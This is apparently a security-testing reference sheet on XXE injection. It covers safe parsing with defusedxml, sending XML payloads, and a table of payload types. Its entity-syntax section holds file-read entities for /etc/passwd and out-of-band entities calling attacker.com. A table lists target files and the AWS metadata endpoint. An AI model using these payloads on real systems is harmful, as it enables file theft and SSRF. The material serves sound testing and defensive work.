# API Reference: Testing for XXE Injection Vulnerabilities

## defusedxml Library (Safe Parsing)

### Installation
```bash
pip install defusedxml
```

### Safe Parsing
```python
import defusedxml.ElementTree as ET
# Blocks external entities, DTD processing, entity expansion
tree = ET.fromstring(xml_string)
```

Protections enabled by default:
- `forbid_dtd`: Blocks DOCTYPE declarations
- `forbid_entities`: Blocks entity definitions
- `forbid_external`: Blocks SYSTEM/PUBLIC entities

## requests Library (XXE Testing)

### Sending XML Payloads
```python
headers = {"Content-Type": "application/xml"}
resp = requests.post(url, headers=headers, data=xxe_payload)
```

## XXE Payload Types
| Type | Description | Detection |
|------|-------------|-----------|
| Classic (in-band) | Entity value in response | Check for file contents |
| Blind (OOB HTTP) | Entity triggers HTTP callback | Monitor callback server |
| Blind (OOB DNS) | Entity triggers DNS lookup | Monitor DNS server |
| Parameter entity | Uses `%entity;` in DTD | Check callback server |
| PHP filter | Base64 encodes file content | Decode base64 in response |
| SSRF via XXE | Access internal URLs | Check for metadata/internal data |

## XXE Entity Syntax
```xml
<!-- Internal entity -->
<!ENTITY name "value">

<!-- External entity (file read) -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- External entity (HTTP) -->
<!ENTITY xxe SYSTEM "http://attacker.com/callback">

<!-- Parameter entity (used in DTD) -->
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
```

## File Paths for Testing
| OS | File | Content Indicator |
|----|------|-------------------|
| Linux | `/etc/passwd` | `root:x:0:0` |
| Linux | `/etc/hostname` | hostname string |
| Windows | `c:/windows/win.ini` | `[fonts]` |
| AWS | `http://169.254.169.254/latest/meta-data/` | `ami-id` |

## References
- defusedxml: https://github.com/tiran/defusedxml
- OWASP XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
